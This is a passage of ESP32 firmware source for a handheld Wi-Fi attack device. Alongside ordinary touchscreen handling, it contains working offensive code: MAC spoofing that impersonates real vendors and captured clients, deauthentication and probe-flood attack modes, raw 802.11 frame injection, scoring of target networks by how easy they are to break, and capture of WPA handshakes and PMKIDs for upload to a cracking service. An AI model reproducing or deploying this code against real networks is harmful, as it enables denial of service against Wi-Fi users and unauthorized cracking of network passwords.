  delay(60);
}

static bool tdisplayTouchInit() {
  Wire.begin(PIN_TOUCH_SDA, PIN_TOUCH_SCL);
  Wire.setClock(400000);
  pinMode(PIN_TOUCH_INT, INPUT_PULLUP);
  tdisplayTouchResetPulse();

  g_tdisplayTouchPresent = false;
  g_tdisplayTouchController = TDisplayTouchController::NONE;
  g_tdisplayTouchAddr = 0;
  g_tdisplayTouchAxesLocked = false;
  g_tdisplayTouchLandscapeCoords = false;

  if (tdisplayI2cProbe(TOUCH_ADDR_CST_SELF)) {
    g_tdisplayTouchPresent = true;
    g_tdisplayTouchController = TDisplayTouchController::CST_SELF;
    g_tdisplayTouchAddr = TOUCH_ADDR_CST_SELF;
  } else if (tdisplayI2cProbe(TOUCH_ADDR_CST_MUTUAL)) {
    g_tdisplayTouchPresent = true;
    g_tdisplayTouchController = TDisplayTouchController::CST_MUTUAL;
    g_tdisplayTouchAddr = TOUCH_ADDR_CST_MUTUAL;
  }

  if (!g_tdisplayTouchPresent) return false;

  const char* ctrl =
      (g_tdisplayTouchController == TDisplayTouchController::CST_SELF) ? "CST_SELF"
      : (g_tdisplayTouchController == TDisplayTouchController::CST_MUTUAL) ? "CST_MUTUAL"
                                                                            : "UNKNOWN";
  Serial.printf("[touch] detected controller=%s addr=0x%02X (SDA=%d SCL=%d INT=%d RST=%d)\n",
                ctrl, g_tdisplayTouchAddr, PIN_TOUCH_SDA, PIN_TOUCH_SCL, PIN_TOUCH_INT, PIN_TOUCH_RST);
  return true;
}
#endif

#if defined(NEONDRIVE_TARGET_CYD28)
static bool cyd28TouchReadRaw(int& outX, int& outY, int& outZ) {
  TouchPoint p = cyd28Touch.getTouch();
  outX = p.xRaw;
  outY = p.yRaw;
  outZ = p.zRaw;
  return (outZ > g_touchZMin);
}
#endif

static bool touch_read_point(TouchState& s) {
  s = TouchState{};
  s.down = false;

#if defined(NEONDRIVE_TARGET_M5TAB5)
  // M5.update() is called at the top of loop() — getDetail() is already fresh.
  // M5GFX applies the display rotation → touch coordinate mapping automatically.
  // SD uses GPIO43/39/44/42 (SCK/MISO/MOSI/CS) — no conflict with GT911 I²C.
  auto td = M5.Touch.getDetail(0);
  if (td.isPressed() || td.wasPressed()) {
    s.down = true;
    s.x    = (int)td.x;
    s.y    = (int)td.y;
    s.z    = 1;
    s.rx   = s.x;
    s.ry   = s.y;
    g_lastTouchRawX = s.rx;
    g_lastTouchRawY = s.ry;
    g_lastTouchRawZ = 1;
    return true;
  }
  return false;
#elif defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  int rx = -1;
  int ry = -1;
  int rz = 0;
  if (!tdisplayReadTouchRaw(rx, ry, rz)) {
    return false;
  }

  int mappedX = 0;
  int mappedY = 0;
  tdisplayMapTouchToScreen(rx, ry, mappedX, mappedY);

  s.rx = rx;
  s.ry = ry;
  s.z = rz;
  s.x = mappedX;
  s.y = mappedY;
  s.down = true;

  g_lastTouchRawX = s.rx;
  g_lastTouchRawY = s.ry;
  g_lastTouchRawZ = s.z;
  return true;
#elif defined(NEONDRIVE_TARGET_CYD28)
  int rx = -1;
  int ry = -1;
  int rz = 0;
  if (!cyd28TouchReadRaw(rx, ry, rz)) {
    return false;
  }

  s.rx = rx;
  s.ry = ry;
  s.z = rz;
  g_lastTouchRawX = s.rx;
  g_lastTouchRawY = s.ry;
  g_lastTouchRawZ = s.z;

  int rawX = s.rx;
  int rawY = s.ry;
  if (g_touchSwapXY) {
    const int tmp = rawX;
    rawX = rawY;
    rawY = tmp;
  }
  int mx = mapRawToRange(rawX, g_touchRawXMin, g_touchRawXMax, display_get_width());
  int my = mapRawToRange(rawY, g_touchRawYMin, g_touchRawYMax, display_get_height());
  if (g_touchInvertX) mx = (display_get_width() - 1) - mx;
  if (g_touchInvertY) my = (display_get_height() - 1) - my;

  s.x = clampi(mx, 0, display_get_width() - 1);
  s.y = clampi(my, 0, display_get_height() - 1);
  return true;
#elif defined(NEONDRIVE_TARGET_TEMBED)
  // T-Embed uses encoder/buttons only; no touch controller.
  return false;
#elif defined(NEONDRIVE_TARGET_M5CARDPUTER)
  // Cardputer has no touch screen — navigation is keyboard-only.
  return false;
#elif defined(NEONDRIVE_TARGET_BUTTON_NAV)
  // Button-nav targets without explicit touch support.
  return false;
#else
  // NOTE: On some CYD/XPT2046 boards, ts.touched() can get "stuck true" after redraws.
  // We avoid that by always sampling getPoint() and using pressure (z) as truth.
  TS_Point p = ts.getPoint();
  s.rx = p.x;
  s.ry = p.y;
  s.z  = p.z;
  g_lastTouchRawX = s.rx;
  g_lastTouchRawY = s.ry;
  g_lastTouchRawZ = s.z;

  // Pressure gate: treat low pressure as NOT pressed (prevents stuck-touch deadlocks).
  // Tuneable threshold:
  if (s.z <= g_touchZMin) {
    return false;
  }

  // Map raw to screen-space.
  // IMPORTANT: when swapXY is active, swap raw axes BEFORE scaling so
  // X still maps to full display width and Y to full display height.
  int rawX = s.rx;
  int rawY = s.ry;
  if (g_touchSwapXY) {
    const int tmp = rawX;
    rawX = rawY;
    rawY = tmp;
  }
  int mx = mapRawToRange(rawX, g_touchRawXMin, g_touchRawXMax, display_get_width());
  int my = mapRawToRange(rawY, g_touchRawYMin, g_touchRawYMax, display_get_height());
  if (g_touchInvertX) mx = (display_get_width() - 1) - mx;
  if (g_touchInvertY) my = (display_get_height() - 1) - my;

  s.x = clampi(mx, 0, display_get_width() - 1);
  s.y = clampi(my, 0, display_get_height() - 1);

  return true;
#endif
}

static TouchState readTouch() {
  TouchState s{};
  if (touch_read_point(s)) s.down = true;
  return s;
}

// Synthetic touch vars must be declared before touchEdgeTriggered() uses them.
#if ND_HW_KEYBOARD
static bool g_synthTouchPending = false;
static int  g_synthTouchX       = 0;
static int  g_synthTouchY       = 0;
#endif

static bool touchEdgeTriggered(int &outX, int &outY) {
  static bool wasDown = false;
  if (millis() < g_touchDebounceUntilMs) return false;

#if ND_HW_KEYBOARD
  // Drain a synthetic touch injected by the keyboard nav system.
  if (g_synthTouchPending) {
    g_synthTouchPending = false;
    outX = g_synthTouchX;
    outY = g_synthTouchY;
    return true;
  }
#endif

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
  TouchState s = readTouch();

  if (s.down && !wasDown) {
    wasDown = true;
    outX = s.x;
    outY = s.y;
    return true;
  }
  if (!s.down) wasDown = false;

  // Hardware buttons remain available as NEXT/SELECT fallback.
  return tdisplayHandleButtonInput(outX, outY);
#else
  TouchState s = readTouch();

  if (s.down && !wasDown) {
    wasDown = true;
    outX = s.x;
    outY = s.y;
    return true;
  }
  if (!s.down) wasDown = false;
  return false;
#endif
}

static void resetTouchLatch() {
}

static void waitTouchRelease() {
  // Non-blocking debounce: avoid frame stalls from delay().
  g_touchDebounceUntilMs = millis() + 40;
  resetTouchLatch();
}


// ---------- Config ----------
static AppConfig cfg;
static bool configDirty = false;

static void saveWifiCredential(const String& ssid, const String& password) {
  wifiSaveCredential(cfg, ssid, password);
}

// ---------- Telemetry API Buffers ----------
struct ConsoleEvent {
  uint32_t seq;
  uint32_t ms;
  char level[6];
  char tag[12];
  char msg[120];
};

struct PacketEvent {
  uint32_t seq;
  uint32_t ms;
  int16_t rssi;
  uint16_t len;
  uint8_t type;
  uint8_t subtype;
  uint8_t channel;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
};

static constexpr uint16_t CONSOLE_RING_SIZE = 32;   // Reduced from 220 to save DRAM for LED feature
static constexpr uint16_t PACKET_RING_SIZE = 32;    // Reduced from 278 to save DRAM for LED feature
static ConsoleEvent consoleRing[CONSOLE_RING_SIZE];
static PacketEvent packetRing[PACKET_RING_SIZE];
static volatile uint32_t consoleSeq = 0;
static volatile uint16_t consoleHead = 0;
static volatile uint32_t packetSeq = 0;
static volatile uint16_t packetHead = 0;
static portMUX_TYPE packetRingMux = portMUX_INITIALIZER_UNLOCKED;

static void pushConsoleEvent(const char* level, const char* tag, const char* msg) {
  if (!msg) return;
  uint16_t idx = consoleHead;
  consoleRing[idx].seq = ++consoleSeq;
  consoleRing[idx].ms = millis();
  strncpy(consoleRing[idx].level, level ? level : "INFO", sizeof(consoleRing[idx].level) - 1);
  consoleRing[idx].level[sizeof(consoleRing[idx].level) - 1] = '\0';
  strncpy(consoleRing[idx].tag, tag ? tag : "SYS", sizeof(consoleRing[idx].tag) - 1);
  consoleRing[idx].tag[sizeof(consoleRing[idx].tag) - 1] = '\0';
  strncpy(consoleRing[idx].msg, msg, sizeof(consoleRing[idx].msg) - 1);
  consoleRing[idx].msg[sizeof(consoleRing[idx].msg) - 1] = '\0';
  consoleHead = (uint16_t)((consoleHead + 1) % CONSOLE_RING_SIZE);
}

static void pushConsoleEventf(const char* level, const char* tag, const char* fmt, ...) {
  char buf[120];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  pushConsoleEvent(level, tag, buf);
}

static void macToStr(const uint8_t mac[6], char out[18]) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ---------- YOINK Log Callback ----------
// Routes YOINK engine log messages into the main console ring
// so the companion app (polling /api/console) and monitor screen see them.
static void yoinkLogCallback(const char* msg) {
  pushConsoleEvent("INFO", "YOINK", msg);
}


// ---------- WiFi Scan Data (Milestone C) ----------

#include "ap_record.h"

#include "wifiscan_helpers.h"
#include "recon_port_scanner.h"

// Diagnostic/fallback controls
#define JAMMIT_PROMISCUOUS_TEST 1

// Global mutex used to serialize Wi-Fi driver calls.  Declared early so helpers
// such as tryAlternateTx() and sniff startup/teardown can reference it.
static SemaphoreHandle_t wifiOpMutex = NULL;

// Forward declarations for functions that are implemented later in the file but
// are referenced from earlier code (startSniff, the test deauth, and auto-mode
// ticks).
static bool macFromString(const char* str, uint8_t* mac);
static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason);
static String normalizeSdWebPath(String path);
static void startAPMode();
static void startWebServer();
static void stopWebServer();
static void timeServiceTick();
static void uiMemLog(const char* tag);
static void uiMemBudgetBoot();
static void drawConfig();
static void drawWifiConfig();
static void drawStartupConfig();
static void drawTelemetryConfig();
static void drawWifiConnect();
static void drawWifiRadarSweep();
static void drawWifiPasswordModal();
static void applyFont(const void *font, int fallback_size);
static void drawWebserver();
static void drawMonitor();
static void drawJustGo();
static void drawAutomateMenu();
static void drawScopeGraph();
static void drawLedControl();
static void drawSync();
static void monitorReset();
static void monitorPushLine(uint16_t color, const char* fmt, ...);
static void monitorUpdateLine(int lineIdx, uint16_t color, const char* fmt, ...);
static void monitorSetFileInfo(const char* txt);
static void monitorLoadFileDir(const char* path);
static void monitorGoParentDir();
static void monitorEnterDir(const char* name);
static void monitorLoadViewFile();
static void monitorLoadFileDirFs(fs::FS& fsRef, const char* path, bool fromSd);
static void push1tSendProbeRequest();
static void specterRandomizeSta();
static void specterSendGhostAuth();
static void justGoStart();
static void justGoStop();
static void justGoTick();
static void push1tTick();
static void specterTick();
static void scopeTick();
static void scopeResetWaterfall();
static void updateWifiConnectStatus();
static void wifiConnectScanTick();
static void connectToWifi(const String& ssid, const String& password);
static void restoreEpochFromLittleFs();
static void syncAllDropbox();
static void syncWithWPASec();
static void downloadWPASecResults();

// AutoMode must be declared before handleCapturedPacket so the promiscuous
// callback can filter on JAMMIT mode without a forward-declaration problem.
enum class AutoMode : uint8_t { NONE, Y0INK, SP3CTER, SCOPE, JAMMIT, PROBE_FLOOD, DEAUTH_FLOOD, PUSH1T };
static AutoMode autoMode = AutoMode::NONE;
static void engageAutoMode(AutoMode mode);
static void disengageAutoMode();
static void exportThreatDataToSD();  // Forward declaration for threat export
static bool mountSdCard(bool verbose);

// ============================================================================
// MAC SPOOFING ENGINE - Vendor OUI + MAC Pool + Per-Frame Rotation  
// ============================================================================
enum class SpoofMode : uint8_t {
  STANDARD = 0,      // Normal randomization (existing)
  MAC_POOL = 1,      // Rotate through discovered client MACs
  VENDOR_OUI = 2,    // Spoof real vendor OUIs (Apple, Samsung, etc.)
  HYBRID = 3         // MAC_POOL + rotate OUI prefixes
};

static SpoofMode activeSpoofMode = SpoofMode::STANDARD;

// Real vendor OUI prefixes (Apple, Samsung, Google, Intel, etc.)
static const uint8_t VENDOR_OUIS[][3] = {
  {0x00, 0x1A, 0xA0},  // Apple
  {0x00, 0x25, 0x86},  // Apple
  {0xA4, 0x77, 0x1F},  // Samsung
  {0x5C, 0xF3, 0x70},  // Samsung
  {0x48, 0xA4, 0x72},  // Google Pixel
  {0x64, 0x16, 0x66},  // Intel
  {0x7C, 0x2F, 0x80},  // Dell
  {0x08, 0x00, 0x27},  // Virtualbox
  {0x52, 0x54, 0x00},  // QEMU
  {0x08, 0x11, 0x96},  // Cisco
  {0x00, 0x0F, 0xE2},  // Netgear
  {0x6C, 0x2B, 0x59},  // Huawei
  {0xB0, 0xBF, 0xB5},  // LG
  {0xE0, 0xFC, 0xBC},  // Sony
  {0x1C, 0x1A, 0x80},  // Linksys
  {0xAA, 0xBB, 0xCC},  // Generic fallback
};
#define VENDOR_OUI_COUNT 16

// MAC pool: discovered client MACs (circular buffer in DRAM, rest offloaded to SD)
#define MAC_POOL_SIZE 1  // Ultra-minimal for DRAM (1 entry only)
static uint8_t macPoolBuffer[MAC_POOL_SIZE][6];
static uint8_t macPoolCount = 0;
static uint8_t macPoolIndex = 0;
static uint32_t lastMacPoolRotateMs = 0;

// Observed MAC history for analysis (stored on SD, loaded on demand)
static const char* MAC_POOL_SD_PATH = "/captures/mac_pool.csv";

// Add discovered MAC to pool if not already present
static void addMacToPool(const uint8_t mac[6]) {
  if (!mac) return;
  for (int i = 0; i < macPoolCount; i++) {
    if (memcmp(macPoolBuffer[i], mac, 6) == 0) return;
  }
  if (macPoolCount < MAC_POOL_SIZE) {
    memcpy(macPoolBuffer[macPoolCount++], mac, 6);
    Serial.printf("[SPOOF] Added MAC to pool: %02X:%02X:%02X:%02X:%02X:%02X (total=%d)\n",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], macPoolCount);
  } else {
    memcpy(macPoolBuffer[macPoolIndex % MAC_POOL_SIZE], mac, 6);
    macPoolIndex++;
  }
}

static const uint8_t* getNextPooledMAC() {
  if (macPoolCount == 0) return nullptr;
  const uint8_t* mac = macPoolBuffer[macPoolIndex % macPoolCount];
  macPoolIndex++;
  return mac;
}

static void spoofMACWithVendorOUI(uint8_t out[6]) {
  uint8_t ouiIdx = random(0, VENDOR_OUI_COUNT);
  memcpy(out, VENDOR_OUIS[ouiIdx], 3);
  out[3] = random(0x00, 0xFF);
  out[4] = random(0x00, 0xFF);
  out[5] = random(0x00, 0xFF);
  out[0] |= 0x02;
  out[0] &= 0xFE;
}

static void spoofMACFromPool(uint8_t out[6]) {
  const uint8_t* pooled = getNextPooledMAC();
  if (pooled) {
    memcpy(out, pooled, 6);
  } else {
    for (int i = 0; i < 6; i++) out[i] = random(0x00, 0xFF);
    out[0] |= 0x02;
    out[0] &= 0xFE;
  }
}

static void spoofMACHybrid(uint8_t out[6]) {
  static uint8_t lastOuiIdx = 0;
  if ((macPoolIndex % 10) == 0) {
    lastOuiIdx = random(0, VENDOR_OUI_COUNT);
  }
  memcpy(out, VENDOR_OUIS[lastOuiIdx], 3);
  out[3] = random(0x00, 0xFF);
  out[4] = random(0x00, 0xFF);
  out[5] = random(0x00, 0xFF);
  out[0] |= 0x02;
  out[0] &= 0xFE;
}

static void applyActiveSpoofMode(uint8_t mac[6]) {
  switch (activeSpoofMode) {
    case SpoofMode::MAC_POOL:
      spoofMACFromPool(mac);
      break;
    case SpoofMode::VENDOR_OUI:
      spoofMACWithVendorOUI(mac);
      break;
    case SpoofMode::HYBRID:
      spoofMACHybrid(mac);
      break;
    case SpoofMode::STANDARD:
    default:
      for (int i = 0; i < 6; i++) mac[i] = random(0x00, 0xFF);
      mac[0] |= 0x02;
      mac[0] &= 0xFE;
  }
  
  // Log spoofed MAC (sample every 50 frames to avoid spam)
  static uint8_t logCounter = 0;
  if (++logCounter >= 50) {
    logCounter = 0;
    Serial.printf("[SPOOF] MAC: %02X:%02X:%02X:%02X:%02X:%02X Mode=%d\n",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
                  (uint8_t)activeSpoofMode);
  }
}

static void exportMacPoolToSD() {
  if (!BOARD_HAS_SD) return;
  if (!mountSdCard(false)) {
    Serial.println("[SPOOF] export skipped: SD not ready");
    return;
  }
  if (!SD.exists("/captures")) SD.mkdir("/captures");

  File f = SD.open(MAC_POOL_SD_PATH, FILE_WRITE);
  if (!f) {
    Serial.printf("[SPOOF] export failed: open %s\n", MAC_POOL_SD_PATH);
    return;
  }

  for (uint8_t i = 0; i < macPoolCount; ++i) {
    const uint8_t* m = macPoolBuffer[i];
    f.printf("%02X:%02X:%02X:%02X:%02X:%02X\n", m[0], m[1], m[2], m[3], m[4], m[5]);
  }
  f.close();
  Serial.printf("[SPOOF] exported %u MAC(s) to %s\n", macPoolCount, MAC_POOL_SD_PATH);
}

static void loadMacPoolFromSD() {
  if (!BOARD_HAS_SD) return;
  if (!mountSdCard(false)) {
    Serial.println("[SPOOF] load skipped: SD not ready");
    return;
  }
  if (!SD.exists(MAC_POOL_SD_PATH)) {
    Serial.printf("[SPOOF] no saved MAC pool at %s\n", MAC_POOL_SD_PATH);
    return;
  }

  File f = SD.open(MAC_POOL_SD_PATH, FILE_READ);
  if (!f) {
    Serial.printf("[SPOOF] load failed: open %s\n", MAC_POOL_SD_PATH);
    return;
  }

  uint8_t loaded = 0;
  while (f.available() && loaded < MAC_POOL_SIZE) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() < 17) continue;

    unsigned v[6] = {};
    if (sscanf(line.c_str(), "%2x:%2x:%2x:%2x:%2x:%2x",
               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) {
      continue;
    }
    uint8_t mac[6];
    for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)v[i];
    addMacToPool(mac);
    loaded++;
  }
  f.close();
  Serial.printf("[SPOOF] loaded %u MAC(s) from %s\n", loaded, MAC_POOL_SD_PATH);
}

// JustGo Attack Profiles (expert pentest modes)
enum class JustGoProfile : uint8_t { STANDARD = 0, STEALTH = 1, PROBE_FIRST = 2, CHAOS = 3 };
static const char* profileNames[] = { "STANDARD", "STEALTH", "PROBE_FIRST", "CHAOS" };
static JustGoProfile justGoProfile = JustGoProfile::STANDARD;

// MAC Spoofing mode for Just Go attacks
static const char* spoofModeNames[] = { "STANDARD", "MAC_POOL", "VENDOR_OUI", "HYBRID" };
static SpoofMode justGoSpoofMode = SpoofMode::STANDARD;  // Can be switched per run

// LED victory flash system (for handshakes/wins)
#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
#define LED_PIN -1
#else
#define LED_PIN 21
#endif
static uint32_t ledFlashEndTime = 0;
static bool ledFlashing = false;

// Flash LED for N seconds when winning (handshake/PMKID capture)
static void flashLEDForVictory(uint32_t durationSeconds = 10) {
  if (LED_PIN < 0) return;
  // Start flashing green for victory
  ledFlashEndTime = millis() + (durationSeconds * 1000);
  ledFlashing = true;
  Serial.printf("[LED] Victory flash enabled for %us (pin %d)\n", durationSeconds, LED_PIN);
}

// Public wrapper for external modules to trigger LED victory
extern "C" void triggerLEDVictoryFlash() {
  flashLEDForVictory(10);  // Flash for 10 seconds
}

// Update LED flash state (call from loop)
static void updateLEDFlash() {
  if (LED_PIN < 0) return;
  if (!ledFlashing) return;
  
  uint32_t now = millis();
  if (now >= ledFlashEndTime) {
    // Flash complete - turn off LED
    ledFlashing = false;
    neopixelWrite(LED_PIN, 0, 0, 0);  // Off
    Serial.printf("[LED] Victory flash complete\n");
    return;
  }
  
  // Flash pattern: fast blink (200ms on/off)
  uint32_t elapsed = now % 400;
  if (elapsed < 200) {
    // ON: bright green for victory
    neopixelWrite(LED_PIN, 0, 255, 0);  // Green
  } else {
    // OFF: very dim green
    neopixelWrite(LED_PIN, 0, 30, 0);  // Dim green
  }
}

// Map profile to spoofing mode and update active mode
static void updateSpoofModeFromProfile() {
  SpoofMode newMode = SpoofMode::STANDARD;
  
  switch (justGoProfile) {
    case JustGoProfile::STEALTH:
      // STEALTH: Passive only, minimal spoofing
      newMode = SpoofMode::STANDARD;  // Basic random MAC
      break;
    case JustGoProfile::PROBE_FIRST:
      // PROBE_FIRST: Advanced technique, use vendor OUI spoofing
      newMode = SpoofMode::VENDOR_OUI;
      break;
    case JustGoProfile::CHAOS:
      // CHAOS: Aggressive, rotate through discovered MACs
      newMode = SpoofMode::MAC_POOL;
      break;
    default:  // STANDARD
      // STANDARD: Hybrid approach for balanced technique
      newMode = SpoofMode::HYBRID;
      break;
  }
  
  if (newMode != justGoSpoofMode) {
    justGoSpoofMode = newMode;
    activeSpoofMode = newMode;
    
    Serial.printf("[PROFILE] Profile changed to %s -> Spoof mode: %s\n",
                  profileNames[(uint8_t)justGoProfile],
                  spoofModeNames[(uint8_t)justGoSpoofMode]);
  }
}

// Forward declarations for spoofing functions (defined later in file)
static void addMacToPool(const uint8_t mac[6]);
static void applyActiveSpoofMode(uint8_t mac[6]);
static void exportMacPoolToSD();
static void loadMacPoolFromSD();

// ============================================================================
// THREAT ASSESSMENT ENGINE - Real-time target threat scoring for Android analysis
// ============================================================================

struct ThreatAssessment {
  char ssid[33];         // Target SSID
  char bssid[18];        // Target BSSID (colon-separated)
  uint8_t threatScore;   // 0-10: 10=hardest, 0=easiest
  uint8_t authType;      // 0=Open, 1=WEP, 2=WPA, 3=WPA2, 4=WPA3
  int8_t rssi;           // Signal strength (-90 to -30 dBm)
  uint8_t channel;       // WiFi channel
  uint32_t timestamp;    // Unix timestamp when assessed
  
  // Scoring factors (0-10 each)
  uint8_t authScore;     // Auth difficulty
  uint8_t signalScore;   // Signal strength factor
  uint8_t clientScore;   // # of detected clients
  uint8_t ssidScore;     // SSID pattern analysis
  
  // Attack metrics from Just Go run
  uint16_t handshakesFound;
  uint16_t deauthsDelivered;
  uint16_t pmkidsFound;
  uint32_t attackDurationMs;
  uint8_t successRate;   // 0-100
  
  // Recommended profile based on threat level
  char recommendedProfile[16];
};

#define MAX_THREAT_ASSESSMENTS 0  // All threat data exported to SD (no DRAM buffer to save space for LED flash)
// Note: threatHistoryBuffer removed - using SD export only for Android companion app analysis
static uint8_t threatHistoryCount = 0;
static uint8_t threatHistoryWriteIdx = 0;  // Circular write position

// Threat scoring helper functions
static uint8_t classifyAuthType(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:  return 0;
    case WIFI_AUTH_WEP:   return 1;
    case WIFI_AUTH_WPA_PSK: return 2;
    case WIFI_AUTH_WPA2_PSK: return 3;
    case WIFI_AUTH_WPA3_PSK: return 4;
    default: return 2; // Default to WPA
  }
}

static uint8_t calculateAuthThreat(wifi_auth_mode_t auth) {
  // Returns 0-10 where 10 = maximum difficulty
  switch (auth) {
    case WIFI_AUTH_OPEN:      return 1;  // Trivial
    case WIFI_AUTH_WEP:       return 2;  // Old/weak
    case WIFI_AUTH_WPA_PSK:   return 6;  // Medium
    case WIFI_AUTH_WPA2_PSK:  return 8;  // Strong
    case WIFI_AUTH_WPA3_PSK:  return 10; // Maximum
    default: return 5;
  }
}

static uint8_t calculateSignalThreat(int rssi) {
  // Weak signals are HARDER to attack (score goes UP)
  // -30 dBm = 0 (trivial), -90 dBm = 10 (impossible)
  if (rssi >= -30) return 0;
  if (rssi <= -90) return 10;
  return (uint8_t)(((-rssi - 30) / 6) & 0xFF);
}

static uint8_t calculateClientThreat(uint8_t clientCount) {
  // More clients = easier to capture handshakes
  if (clientCount >= 6) return 2;      // Trivial - many clients
  if (clientCount >= 4) return 3;
  if (clientCount >= 2) return 5;
  if (clientCount == 1) return 7;
  return 10;  // No clients - very hard
}

static uint8_t analyzeSSIDThreat(const String& ssid) {
  // Heuristic: generic names like "WiFi", "Network" = easier
  // Corporate/meaningful names = harder (suggests security awareness)
  String lower = ssid;
  lower.toLowerCase();
  
  // Common/generic patterns = lower threat
  if (lower.indexOf("wifi") >= 0) return 2;
  if (lower.indexOf("network") >= 0) return 2;
  if (lower.indexOf("guest") >= 0) return 2;
  if (lower.indexOf("free") >= 0) return 1;
  if (lower.indexOf("xfinity") >= 0) return 2;
  if (lower.indexOf("comcast") >= 0) return 2;
  if (lower.indexOf("linksys") >= 0) return 3;
  
  // Generic numbers = lower threat
  if (ssid.length() <= 3) return 2;
  
  // Default mid-threat for unknown patterns
  return 5;
}

static uint8_t calculateCompositeThreat(const ApRecord& ap, uint8_t estimatedClients) {
  uint8_t authScore = calculateAuthThreat(ap.auth);
  uint8_t signalScore = calculateSignalThreat(ap.rssi);
  uint8_t clientScore = calculateClientThreat(estimatedClients);
  uint8_t ssidScore = analyzeSSIDThreat(ap.ssid);
  
  // Weighted composite (auth is most important)
  uint8_t composite = (authScore * 4 + signalScore * 2 + clientScore + ssidScore) / 8;
  return (composite > 10) ? 10 : composite;
}

static const char* recommendProfile(uint8_t threatScore) {
  // AI-driven profile recommendation based on threat level
  if (threatScore >= 9) return "PROBE_FIRST";  // Hardest - use advanced technique
  if (threatScore >= 7) return "STANDARD";     // Medium - balanced attack
  if (threatScore >= 5) return "CHAOS";        // Chaos works well on mid-tier
  if (threatScore >= 3) return "STEALTH";      // Weak - go passive
  return "STEALTH";                             // Very weak - passive only
}

// Record a threat assessment for a target (STUB - data goes to SD export directly)
static void recordThreatAssessment(const ApRecord& ap, uint8_t estimatedClients) {
  // Threat assessment data is now exported directly to SD for Android app analysis
  // DRAM buffer removed to make room for LED victory flash feature
  (void)ap;  // unused
  (void)estimatedClients;  // unused
}

// JAMMIT client tracking (populated from promiscuous sniffer)
#define JAMMIT_MAX_CLIENTS 8
static uint8_t    jammitClientMacs[JAMMIT_MAX_CLIENTS][6];
static uint8_t    jammitClientCount = 0;
static portMUX_TYPE jammitClientMux = portMUX_INITIALIZER_UNLOCKED;

// Cached target BSSID bytes for ISR-safe comparison in promiscuous callback
static uint8_t  s_jammitTargetBssid[6] = {0};
static bool     s_jammitBssidCached    = false;

// JAMMIT session log + deauth PCAP paths (set at engageAutoMode time)
static char     jammitSessionLogPath[128] = {0};
static char     jammitDeauthPcapPath[128] = {0};
static uint32_t jammitSessionStartMs      = 0;

// Forward declarations for JAMMIT helpers (defined later, called from engage/disengage)
static void jammitLog(const char* fmt, ...);
static void jammitInitSaveFiles();
static void startJammitWifi();
static void stopJammitWifi();

static esp_err_t tryAlternateTx(const uint8_t* pkt, int len) {
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  (void)pkt; (void)len;
  return neon_rf_log_unsupported("tryAlternateTx");
#endif
  static uint32_t lastPromToggleMs = 0;
  static uint32_t lastApAttemptMs = 0;
  esp_err_t r = ESP_ERR_INVALID_STATE;

  // First, try a one-shot promiscuous toggle if enabled and not done recently
#if JAMMIT_PROMISCUOUS_TEST
  if (millis() - lastPromToggleMs > 30000) {
    lastPromToggleMs = millis();
    if (wifiOpMutex) {
      if (xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
        esp_wifi_set_promiscuous(false);
        delay(10);
        r = esp_wifi_80211_tx(WIFI_IF_STA, pkt, len, false);
        esp_wifi_set_promiscuous(true);
        xSemaphoreGive(wifiOpMutex);
      } else {
        Serial.println("[wifi] tryAlternateTx: wifiOpMutex timeout");
      }
    } else {
      esp_wifi_set_promiscuous(false);
      delay(10);
      r = esp_wifi_80211_tx(WIFI_IF_STA, pkt, len, false);
      esp_wifi_set_promiscuous(true);
    }
    if (r == ESP_OK) return r;
    // fall through to AP attempt
  }
#endif

  // Next, try AP interface, but only if AP mode is active (avoid invalid interface)
  int mode = WiFi.getMode();
  if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
    if (millis() - lastApAttemptMs > 10000) {
      lastApAttemptMs = millis();
      if (wifiOpMutex) {
        if (xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
          r = esp_wifi_80211_tx(WIFI_IF_AP, pkt, len, false);
          xSemaphoreGive(wifiOpMutex);
        } else {
          Serial.println("[wifi] tryAlternateTx AP attempt: wifiOpMutex timeout");
        }
      } else {
        r = esp_wifi_80211_tx(WIFI_IF_AP, pkt, len, false);
      }
      return r;
    }
  }

  return r;
}


// ---------- Packet Capture (PCAP) ----------
// PCAP global header (24 bytes)
struct PcapGlobalHeader {
  uint32_t magic_number = 0xa1b2c3d4;     // Magic number
  uint16_t version_major = 2;              // Major version
  uint16_t version_minor = 4;              // Minor version
  int32_t thiszone = 0;                    // Timezone offset
  uint32_t sigfigs = 0;                    // Timestamp accuracy
  uint32_t snaplen = 65535;                // Snapshot length
  uint32_t network = 127;                  // Link layer type (802.11)
};

// PCAP packet header (16 bytes per packet)
struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// Capture file handles
static File rawPcapFile;
static File beaconPcapFile;
static File handshakePcapFile;
static char captureDir[80] = {0};  // Reduced to save DRAM
static bool pcapFilesOpen = false;
static bool pcapCaptureActive = false;

// Capture mode: determines what gets written
enum class CaptureMode : uint8_t { NONE, RAW_ALL, SELECTIVE };  // RAW_ALL = all packets, SELECTIVE = beacons + handshakes only
static CaptureMode captureMode = CaptureMode::NONE;

static uint16_t capturedHandshakes = 0;  // total EAPOL frames captured (all modes)

static bool sdReady = false;
static uint32_t sdLastRetryMs = 0;
static bool hasTarget = false;
static volatile uint32_t sniffPacketCount = 0;
static bool sniffActive = false;
static bool rawCaptureActive = false;

